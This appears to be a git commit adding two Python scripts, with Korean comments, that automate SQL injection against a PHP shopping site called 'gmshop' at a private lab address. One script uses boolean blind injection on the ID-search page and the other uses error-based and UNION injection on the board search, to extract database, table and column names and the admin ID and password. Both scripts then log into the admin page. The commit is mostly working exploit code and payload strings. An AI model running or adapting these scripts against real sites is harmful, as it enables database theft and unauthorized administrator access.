9d60a7ab61f09430513b3d10dd8a885a8e5a670a
dnsdudrla97 <dnsdudrla97@naver.com>
2020-07-10 19:54:55 +0900

    sql

---
+++ gm_blind_sql.py
@@ -0,0 +1,237 @@
+from bs4 import BeautifulSoup
+import requests
+import re
+
+# http://192.168.81.129/gmshop/idsearch.php?userid=
+URL = 'http://192.168.81.129/gmshop/idsearch.php'
+cookies = {"PHPSESSID":"da519c2141b0a35c10d91abd16b4d2d0"}
+
+# TRUE: 해당하는 ID가 이미 있습니다. (17)
+# FALSE: 사용할수있는 ID 입니다. (14)
+def boolType():
+    res1 = requests.get(URL, params={'userid':'\'or 1=1#'}, cookies=cookies)
+    res2 = requests.get(URL, params={'userid':'\'or 1=2#'}, cookies=cookies)
+    html1=res1.content.decode('euc-kr', 'replace')
+    html2=res2.content.decode('euc-kr', 'replace')
+
+    soup1=BeautifulSoup(html1)
+    soup2=BeautifulSoup(html2)
+
+    trueType=soup1.find('td', height='30')  
+    falseType=soup2.find('td', height='30')  
+    print("[TRUE]문자열: {str}\n[TRUE]문자열 길이:{len}".format(str=trueType.text, len=len(trueType.text)))
+    print("[FALSE]문자열: {str}\n[FALSE]문자열 길이:{len}".format(str=falseType.text, len=len(falseType.text)))        
+boolType()
+
+# 쿼리 요청 응답 마스터
+def query_master(parm):
+    res=requests.get(URL, params=parm, cookies=cookies)
+    html=res.content.decode('euc-kr', 'replace')
+    soup=BeautifulSoup(html)
+    check = soup.find('td', height='30')  
+    return check.text
+
+# 데이터 베이스 길이 구하기
+def get_database_length():
+    for l in range(10):
+        get_data = {'userid':'\' or 1=1 and length(database())={l}#'.format(l = l)}
+        check = query_master(get_data)
+
+        if (len(check) == 17):
+            print("[+] 데이터베이스 길이 : %d"%l)
+            break
+    return l
+
+
+# 데이터베이스 명 구하기
+def get_database_name(length):
+    database_name = ''
+    for idx in range(length+1):
+        for a in range(33,127):
+            get_data = {'userid':'\' or 1=1 and ascii(substring(database(), {idx}, 1))={ascii}#'.format(idx = idx, ascii=a)}
+            check = query_master(get_data)
+
+            if (len(check) == 17):
+                database_name += chr(a)
+                print("[SUCESS] {c}".format(c=database_name))
+                break
+    print("[+] 데이터베이스 명 : "+database_name)
+    return database_name
+
+
+
+# 테이블 길이 구하기
+def get_table_length(name):
+    for a in range(20):
+        get_data = {'userid':'\' or 1=1 and length((select table_name \
+            from information_schema.tables \
+            where TABLE_TYPE=\'base table\' \
+            and TABLE_SCHEMA=\'{db_name}\' limit 2,1))={length}#'.format(db_name=name, length=a)}
+        check = query_master(get_data)
+
+        if (len(check) == 17):
+            print("[+] 테이블 길이 : %d"%a)
+            break
+    return a
+
+            
+# 테이블 명 구하기 쿼리
+def get_table_name_query(length, db_name):
+    # ' or 1=1 and ascii(substring((select table_name from information_schema.tables where TABLE_TYPE='base table' limit 0,1),1,1))<130#
+    table_name = ''
+    for idx in range(length+1):
+        for a in range(33,127):
+            get_data = {'userid':'\' or 1=1 and ascii( \
+                substring((select table_name \
+                from information_schema.tables \
+                where TABLE_TYPE=\'base table\' \
+                and TABLE_SCHEMA=\'{db_name}\' limit 2,1),{idx},1))={ascii}#'.format(db_name = db_name, idx=idx, ascii=a)}
+            check = query_master(get_data)
+            
+            if (len(check) == 17):
+                table_name += chr(a)
+                print("[SUCESS] {c}".format(c=table_name))
+                break
+    print("[+] 테이블 명 : "+table_name)
+    return table_name
+
+# 데이터 길이 구하기
+def get_col_length(name):
+    for a in range(20):
+        get_data1 = {'userid':'\' or 1=1 and length((select column_name \
+        from information_schema.columns \
+        where table_name=\'{tb_name}\' limit 3,1))={length}#'.format(tb_name=name, length=a)}
+        check1 = query_master(get_data1)
+        if (len(check1) == 17):
+            print("[+] check1 데이터 길이 : %d"%a)
+            break
+
+    for b in range(20):
+        get_data2 = {'userid':'\' or 1=1 and length((select column_name \
+        from information_schema.columns \
+        where table_name=\'{tb_name}\' limit 4,1))={length}#'.format(tb_name=name, length=b)}
+        check2 = query_master(get_data2)
+        if (len(check2) == 17):
+            print("[+] check2 데이터 길이 : %d"%b)
+            break
+    return a, b
+
+
+# 데이터 문자 구하기
+def get_col_name(name, data_num1, data_num2):
+    data_str1 = ''
+    data_str2 = ''
+    for n in range(data_num1+1):
+        for a in range(33, 127):
+            get_data1 = {
+                'userid':'\' or 1=1 and ascii(substring(( \
+                    select column_name from information_schema.columns \
+                     where table_name=\'{tb_name}\' limit 3,1), {num}, 1))={ascii}#'.format(tb_name=name, num=n, ascii=a)}
+            data1 = query_master(get_data1)            
+
+            if (len(data1) == 17):
+                data_str1+=chr(a)
+                print("[+] 데이터 문자열 : %s"%data_str1)
+                break
+
+    for n in range(data_num2+1):
+        for b in range(33, 127):
+            get_data2 = {
+                'userid':'\' or 1=1 and ascii(substring(( \
+                    select column_name from information_schema.columns \
+                     where table_name=\'{tb_name}\' limit 4,1), {num}, 1))={ascii}#'.format(tb_name=name, num=n, ascii=b)}    
+            data2 = query_master(get_data2)
+
+            if (len(data2) == 17):
+                data_str2+=chr(b)
+                print("[+] 데이터 문자열 : %s"%data_str2)
+                break
+    print("[+] 첫 번째 컬럼 데이터 : %s"%data_str1)
+    print("[+] 두 번째 컬럼 데이터 : %s"%data_str2)
+    return data_str1, data_str2
+
+# 데이터 길이
+def get_get_data_len(col1, col2, name):
+    for a in range(20):
+        get_data1 = {
+            'userid' : '\' or 1=1 and length((select {col1} from \
+            {tb_name} limit 0, 1))={len}#'.format(col1=col1, tb_name=name, len=a)
+            }
+        get_data2 = {
+            'userid' : '\' or 1=1 and length((select {col2} from \
+            {tb_name} limit 0, 1))={len}#'.format(col2=col2, tb_name=name, len=a)
+            }
+        data1 = query_master(get_data1)
+        data2 = query_master(get_data2)
+
+        if (len(data1) == 17 & len(data2) == 17):
+            break
+    print("[+] 데이터 길이 : %d"%a)
+    return a
+
+
+
+# 데이터 문자 구하기
+def get_get_data_name(name,col1, col2, num):
+    data_str1 = ''
+    data_str2 = ''
+    for n in range(num+1):
+        for a in range(33, 127):
+            get_data1 = {'userid': '\' or 1=1 and ascii(substring((select {col1} from {tb_name} limit 0,1),{num},1))={ascii}#'.format(
+                tb_name=name, col1=col1, num=n, ascii=a)}
+            data1 = query_master(get_data1)            
+
+            if (len(data1) == 17):
+                data_str1+=chr(a)
+                print("[+] 데이터 문자열 : %s"%data_str1)
+                break
+    
+        for b in range(33, 127):
+            get_data2 = {
+                'userid': '\' or 1=1 and ascii(substring((select {col2} from {tb_name} limit 0,1),{num},1))={ascii}#'.format(
+                tb_name=name, col2=col2, num=n, ascii=b)}
+            data2 = query_master(get_data2)
+
+            if (len(data2) == 17):
+                data_str2+=chr(b)
+                print("[+] 데이터 문자열 : %s"%data_str2)
+                break
+    print("[+] 데이터 : %s"%data_str1)
+    print("[+] 데이터 : %s"%data_str2)
+    return data_str1, data_str2
+
+# admin_login
+def admin_login(d1,d2,id, pw):
+    print('[+] admin page 접속')
+    ADMINURL='http://192.168.81.129/gmshop/admin/'
+    res = requests.post(ADMINURL, data={d1:id, d2:pw}, cookies=cookies)    
+    if res.status_code == 200:
+        print('[+] admin page 접속 완료')  
+
+
+# 데이터베이스 길이
+gdbl = get_database_length()
+
+# 데이터베이스 명 구하기
+gdbn = get_database_name(gdbl)
+
+# 테이블 길이 구하기
+gtl = get_table_length(gdbn)
+
+# 테이블 명 구하기
+gtn = get_table_name_query(gtl, gdbn)
+
+# 컬럼 길이 구하기
+gcl1,gcl2 = get_col_length(gtn)
+
+# 컬럼 명령이
+gcn1, gcn2 = get_col_name(gtn, gcl1, gcl2)
+
+# 데이터 길이
+ggdl = get_get_data_len(gcn1, gcn2, gtn)
+
+# 데이터 문자 구하기
+a_id, a_pw = get_get_data_name(gtn, gcn1, gcn2, ggdl)
+
+# admin 페이지 로그인
+admin_login(gcn1, gcn2, a_id, a_pw)
---
+++ gm_error_base_sql.py
@@ -0,0 +1,227 @@
+from bs4 import BeautifulSoup
+import requests
+import re
+
+URL = 'http://192.168.81.129/gmshop/board_list.php'
+cookies = {"PHPSESSID":"da519c2141b0a35c10d91abd16b4d2d0"}
+
+# 사진 컨테스트 컬럼 정보 파싱
+def get_use_column(response):
+    html = response.text
+    soup = BeautifulSoup(html, 'html.parser')
+    # data = soup.find('div',align='center')
+    _font = soup.select('td>div>font')
+    data=''
+    for font in _font:
+        data+=font.text+' '
+    
+    return data[-4:]
+
+# 에러 정보 파싱
+def get_html(response):
+    html = response.text
+    soup = BeautifulSoup(html, 'html.parser')
+    my_table = soup.select(
+        'td'
+    )
+    data=''
+    for table in my_table:
+        ## Tag안의 텍스트
+        # print(table.text)
+        data+=table.text
+    return data
+
+# 컬럼 수 
+def column_num():
+    for i in range(1,30):
+        post_data = {'boardIndex':'4',
+        'search':'name', 
+        'searchstring':'\' order by %d#'%i}
+
+        res = requests.post(URL, data = post_data, cookies=cookies)
+        data = get_html(res)
+
+        check_warning = re.findall("mysql_fetch_array()", data)
+
+        if check_warning:
+            print('[+] 컬럼 수 쿼리 '+post_data.get("searchstring"))
+            return i # table numberic
+
+# 사용 컬럼 개수 위치 파악 쿼리 제작
+def column_read_query(num):
+    read_query = "union select "
+    for i in range(1,num):
+        read_query += str(i)+','    
+    
+    read_query = '0\'' + read_query.rstrip(",") + '#'
+    return read_query
+
+# 사용 컬럼 파악
+def column_read(query):
+    post_data = {'boardIndex':'4',
+        'search':'name', 
+        'searchstring':'%s'%query}
+    print('[+] 사용 컬럼 파악 쿼리 '+post_data.get("searchstring"))
+    res = requests.post(URL, data = post_data, cookies=cookies)    
+    data = get_html(res)   
+    
+    check_warning = re.findall("mktime()", data)
+
+    if check_warning:
+        data = get_use_column(res)
+        print("[+] 사용 컬럼 : "+data)
+
+# 테이블 이름 쿼리 제작
+def get_table_name_query(num):
+    table_name_query = "union select "
+    for i in range(1,num):        
+        if (i == 3):
+                table_name_query += 'table_name'+','
+        else:    
+            table_name_query += str(i)+','    
+    table_name_query = '0\'' + table_name_query.rstrip(",") + ' from information_schema.tables#'    
+    return table_name_query        
+
+# 테이블 이름 리스트
+def get_table_name_list(response):
+    html = response.text
+    soup = BeautifulSoup(html, 'html.parser')
+    # data = soup.find('div',align='center')
+    _name = soup.find_all('font', color="009BD4")
+    name_list = []
+    for name in _name:
+        # print(name.text)
+        name_list.append(name.text)
+    return name_list
+    
+
+# 테이블 이름 가져오기
+def get_table_name(query):
+    post_data = {'boardIndex':'4',
+        'search':'name', 
+        'searchstring':'%s'%query}
+    print('[+] 테이블 이름 가져오기 쿼리 '+post_data.get('searchstring'))
+    res = requests.post(URL, data = post_data, cookies=cookies)        
+    table_name_list = get_table_name_list(res)
+
+    target_table = ['admin', 'administrator', 'member', 'user']
+    exploit_table_list = []
+    for tnl in table_name_list:
+        for tt in target_table:
+            if (tt==tnl):
+                print("[+] 대상 테이블 이름 : %s"%tt)
+                exploit_table_list.append(tt)
+                break
+    return exploit_table_list
+
+# 컬럼 정보 가져오기 쿼리 제작
+def get_column_info_query(num, exploitTableName):
+    get_column_info_query = "union select "
+    for i in range(1,num):        
+        if (i == 3):
+                get_column_info_query += 'column_name'+','
+        else:    
+            get_column_info_query += str(i)+','    
+    get_column_info_query = '0\'' + get_column_info_query.rstrip(",") + ' from information_schema.columns where table_name=\''+exploitTableName+'\'#'   
+    return get_column_info_query
+
+# 컬럼 정보 필터링
+def get_column_info_filter(response):
+    html = response.text
+    soup = BeautifulSoup(html, 'html.parser')
+    # data = soup.find('div',align='center')
+    _column_info = soup.find_all('font', color="009BD4")
+    info_list = []
+    for info in _column_info:
+        # print(info.text)
+        info_list.append(info.text)
+    return info_list
+
+
+# 컬럼 정보 가져오기
+def get_column_info(query):
+    post_data = {'boardIndex':'4',
+        'search':'name', 
+        'searchstring':'%s'%query}
+    print('[+] 컬럼 정보 가져오기 쿼리 '+post_data.get('searchstring'))
+    res = requests.post(URL, data = post_data, cookies=cookies)
+    column_info = get_column_info_filter(res)
+    cnt = 0
+    column_info_idx = []
+    for ci in column_info:
+        if (re.findall('admin', ci)):
+            column_info_idx.append(ci)
+            print('[%d] admin 컬럼 %s'%(cnt, column_info_idx[cnt]))            
+            cnt += 1            
+    
+    return column_info_idx  
+
+# admin 테이블 컬럼 확인 쿼리 제작
+def get_admin_table_query(num, adminColumn, exploitTableName):
+    admin_table_query = "union select "
+    for i in range(1,num):        
+        if (i == 3):
+            admin_table_query += str(adminColumn[0])+','
+        elif (i == 8):
+            admin_table_query += str(adminColumn[1])+','
+        else:    
+            admin_table_query += str(i)+','    
+
+    admin_table_query = '0\'' + admin_table_query.rstrip(",")+' from '+exploitTableName+'#'
+    # print (admin_table_query)
+    return admin_table_query
+
+    
+# admin 테이블 컬럼 필터링
+def get_admin_table_filter(response):
+    html = response.text
+    soup = BeautifulSoup(html, 'html.parser')
+    # data = soup.find('div',align='center')
+    _id = soup.find_all('font', color="009BD4")
+    _pwd = soup.find_all('font', attrs={"class":"stext"})
+    account = {}
+    for id in _id:
+        account = {'adminId':id.text}
+    account['adminPwd']=_pwd[8].text
+    return account
+    
+
+# admin 테이블 컬럼 확인 (adminId, adminPwd, adminEmail, adminEmail2)
+def get_admin_table(query):
+    post_data = {'boardIndex':'4',
+        'search':'name', 
+        'searchstring':'%s'%query}
+    print('[+] admin 테이블 컬럼 확인 쿼리 '+post_data.get('searchstring'))
+    res = requests.post(URL, data = post_data, cookies=cookies)
+    admin_account = get_admin_table_filter(res)
+    return admin_account
+
+
+# admin page 접속
+def admin_login(account):
+    print('[+] admin page 접속')
+    ADMINURL='http://192.168.81.129/gmshop/admin/'
+    res = requests.post(ADMINURL, data=account, cookies=cookies)    
+    if res.status_code == 200:
+        print('[+] admin page 접속 완료')  
+
+
+
+colNum = column_num()
+
+rQuery = column_read_query(colNum)
+column_read(rQuery)
+
+tQuery = get_table_name_query(colNum)
+exploit_table_list = get_table_name(tQuery)
+
+cQuery = get_column_info_query(colNum, exploit_table_list[0])
+adminColumn = get_column_info(cQuery)
+# print(adminColumn)
+
+adminQuery = get_admin_table_query(colNum, adminColumn, exploit_table_list[0])
+admin_account = get_admin_table(adminQuery)
+
+admin_login(admin_account)
+
+
